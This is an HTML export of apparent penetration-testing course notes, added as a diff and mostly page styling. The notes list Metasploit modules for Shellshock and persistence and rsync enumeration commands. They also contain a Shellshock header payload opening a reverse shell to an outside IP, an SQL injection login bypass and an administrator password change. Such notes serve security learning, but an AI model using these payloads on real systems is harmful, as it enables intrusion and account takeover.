@@ -1,0 +1,786 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>ADDITIONAL NOTES</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="27165c01-9416-8069-8465-d76c22d42829" class="page sans"><header><img class="page-cover-image" src="ADDITIONAL%20NOTES/additional_notes_banner.png" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="ADDITIONAL%20NOTES/additional_notes_icon.png"/></div><h1 class="page-title" dir="auto">ADDITIONAL NOTES</h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><p id="29565c01-9416-8084-a2a6-d8c30b1496f9" class="">ADDED IMPORTANT STUFF</p></div><div style="display:contents" dir="auto"><hr id="27165c01-9416-80d4-bb2e-dc1a67766228"/></div><div style="display:contents" dir="auto"><p id="27165c01-9416-802a-8136-e9c93df4c9f3" class="">
+</p></div><div style="display:contents" dir="auto"><p id="27165c01-9416-80af-b10e-fbcd2baf7a28" class="">Windows vulnerabilities covered in the course…</p></div><div style="display:contents" dir="auto"><ol type="1" id="27165c01-9416-80b7-bf6f-fe880b87d156" class="numbered-list" start="1"><li>Eternal Blue { SMBv1}</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="27165c01-9416-80a6-9154-e41e0eb48549" class="numbered-list" start="2"><li>BlueKeep { RDP }</li></ol></div><div style="display:contents" dir="auto"><p id="27165c01-9416-8080-8f03-ddb2182d41a0" class="">
+</p></div><div style="display:contents" dir="auto"><p id="27165c01-9416-80bf-a842-ee321b1fe0af" class="">Linux Vulnerabilities covered in the course.</p></div><div style="display:contents" dir="auto"><ol type="1" id="27165c01-9416-8027-b062-dd076d53c9db" class="numbered-list" start="1"><li>ShellShock <div style="display:contents" dir="auto"><ol type="a" id="27165c01-9416-804b-a6a6-f22ebcd77eaa" class="numbered-list" start="1"><li>check vulnerability ——&gt; auxiliary/scanner/http/apache_mod_cgi_bash_env  2014-09-24       normal  Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner<br/></li></ol></div><div style="display:contents" dir="auto"><ol type="a" id="27165c01-9416-80d8-9a67-d4789ed02a17" class="numbered-list" start="2"><li>exploit it ——&gt; exploit(multi/http/apache_mod_cgi_bash_env_exec) </li></ol></div></li></ol></div><div style="display:contents" dir="auto"><p id="28165c01-9416-808b-938e-f1cd3395e10e" class=""><div class="indented"><div style="display:contents" dir="ltr"><figure id="28165c01-9416-8026-b6b8-cdb9bece38c9" class="image"><a href="ADDITIONAL%20NOTES/image.png"><img style="width:639.1591186523438px" src="ADDITIONAL%20NOTES/image.png"/></a></figure></div></div></p></div><div style="display:contents" dir="auto"><p id="28165c01-9416-801e-8e07-c9cb7859dc9e" class="">
+</p></div><div style="display:contents" dir="auto"><p id="28165c01-9416-8069-aaa0-fc37f206e0ae" class=""><code>User-Agent: () { :; } ; echo; echo; /bin/bash -c &#x27;bash -i&gt;&amp;/dev/tcp/192.75.196.2/1234 0&gt;&amp;1’</code></p></div><div style="display:contents" dir="auto"><p id="29765c01-9416-80aa-bb78-fb18a3cb14e6" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="29765c01-9416-8077-9518-c9305c8484a7" class="image"><a href="ADDITIONAL%20NOTES/image%201.png"><img style="width:709.9874877929688px" src="ADDITIONAL%20NOTES/image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="29765c01-9416-809a-8c2c-f5e7dc319683" class="">
+</p></div><div style="display:contents" dir="auto"><p id="28165c01-9416-807d-b183-fe6ef2b89d74" class=""><code>admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--</code>  <mark class="highlight-teal">//SQLi most common payload</mark></p></div><div style="display:contents" dir="auto"><p id="27165c01-9416-8058-9bb4-c26ff62737a6" class="">LEARN ABOUT WMAP</p></div><div style="display:contents" dir="auto"><p id="28b65c01-9416-80f6-955f-c98b056df531" class="">
+</p></div><div style="display:contents" dir="auto"><p id="28765c01-9416-80b6-8b5c-c6f47141d963" class=""><code>search platform:windows/linux persistence</code> —&gt; Check for persistence modules. </p></div><div style="display:contents" dir="auto"><p id="28765c01-9416-80a1-a904-faf3cabebd5a" class="">
+</p></div><div style="display:contents" dir="auto"><p id="28165c01-9416-8012-b561-ccf864f735c3" class="">RSYNC SERVER useful commands  : <div class="indented"><div style="display:contents" dir="auto"><h2 id="28765c01-9416-8030-86f4-c05c17adfc3f" class="">✅ 2. <strong>List available rsync shares (modules)</strong></h2></div><div style="display:contents" dir="auto"><p id="28765c01-9416-80d6-86ed-f3dac5d27879" class="">You can list the available &quot;modules&quot; (like shares on an rsync server) using:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28765c01-9416-80eb-b1f8-d527774edd2e" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rsync rsync://rsync.example.com/</code></pre></div><div style="display:contents" dir="auto"><p id="28765c01-9416-80e1-afa5-d219b10065fb" class="">This will output something like:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28765c01-9416-80a8-87e5-f47ba7e5f902" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">backup       Daily backups
+media        Shared media files</code></pre></div><div style="display:contents" dir="auto"><p id="28765c01-9416-80e1-97e9-c63911dd0ab1" class="">These are top-level directories (modules) that the server exports.</p></div><div style="display:contents" dir="auto"><hr id="28765c01-9416-806e-b92b-eff43c035d05"/></div><div style="display:contents" dir="auto"><h2 id="28765c01-9416-80db-a0d2-c035cf7da1cb" class="">✅ 3. <strong>Browse a specific share</strong></h2></div><div style="display:contents" dir="auto"><p id="28765c01-9416-804f-a875-d2200e4372c8" class="">To list the contents of a specific module, run:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28765c01-9416-80ff-9e2b-ca8313e156c7" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rsync rsync://rsync.example.com/media/</code></pre></div><div style="display:contents" dir="auto"><p id="28765c01-9416-802e-a394-da24b53d867c" class="">This shows the directory structure inside the <code>media</code> share.</p></div><div style="display:contents" dir="auto"><p id="28765c01-9416-8064-98f8-e6ac8a35d105" class="">You can also browse subdirectories:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28765c01-9416-8090-b713-f788f2a5aee6" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rsync rsync://rsync.example.com/media/music/</code></pre></div><div style="display:contents" dir="auto"><hr id="28765c01-9416-8001-b719-ea63d069a8f6"/></div><div style="display:contents" dir="auto"><h2 id="28765c01-9416-8008-8d73-e74caaa99373" class="">✅ 4. <strong>Download content to your local machine</strong></h2></div><div style="display:contents" dir="auto"><p id="28765c01-9416-8059-bbc1-d590c8eb3067" class="">To copy files or entire directories from the rsync server, use:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="28765c01-9416-804e-a169-cc344629860f" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rsync -av rsync://rsync.example.com/media/ /path/to/local/folder/</code></pre></div><div style="display:contents" dir="auto"><ul id="28765c01-9416-80eb-a229-fa16f160b22a" class="bulleted-list"><li style="list-style-type:disc"><code>a</code>: archive mode (preserves permissions, symlinks, etc.)</li></ul></div><div style="display:contents" dir="auto"><ul id="28765c01-9416-809d-b95b-fc299cdb4819" class="bulleted-list"><li style="list-style-type:disc"><code>v</code>: verbose (shows progress)</li></ul></div></div></p></div><div style="display:contents" dir="auto"><hr id="28a65c01-9416-80bd-a22d-dbc74a6d2f1e"/></div><div style="display:contents" dir="auto"><h2 id="28a65c01-9416-801c-8403-fc528c686b9a" class="block-color-blue"><em>CHANGE PASSWORD OF A PARTICULAR USER ON WINDOWS</em></h2></div><div style="display:contents" dir="auto"><p id="28a65c01-9416-809a-a090-e014228d1661" class="block-color-teal"><em>(requires administrative privileges)</em></p></div><div style="display:contents" dir="auto"><p id="28a65c01-9416-801c-a084-fe4111b8671e" class=""><code>net user administrator hacker_123321</code> —&gt; command to run in shell.</p></div><div style="display:contents" dir="auto"><p id="28a65c01-9416-8059-a063-ceeff62a4685" class="">
